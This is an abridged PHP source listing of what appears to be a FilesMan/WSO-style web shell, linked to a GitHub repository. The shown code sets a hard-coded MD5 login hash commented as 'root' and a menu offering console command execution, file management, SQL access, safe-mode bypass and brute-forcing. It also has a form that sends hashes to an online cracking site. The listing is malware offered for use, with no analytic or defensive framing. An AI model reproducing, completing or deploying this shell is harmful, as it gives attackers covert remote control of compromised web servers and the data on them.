<?php 
$▛ = "63a9f0ea7bb98050796b649e85481845"; //root ||| Online generator http://www.md5.cz 
$▘ = true; 
$▜ = 'UTF-8'; 
$▚ = 'FilesMan'; 
...
<input type=hidden name=charset> 
    ...
    $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce'); 
    if(!empty($GLOBALS['▛'])) 
    $m['Logout'] = 'Logout'; 
...
function actionStringTools() { 
    ...
    echo "</div><br><h1>Search for hash:</h1><div class=content> 
        <form method='post' target='_blank' name='hf'> 
            ...
            <input type='submit' value='crackstation.net' onclick=\"document.hf.action='http://crackstation.net/';document.hf.submit()\"><br> 
...
?>
// https://github.com/trhacknonimous/phpFileManager/
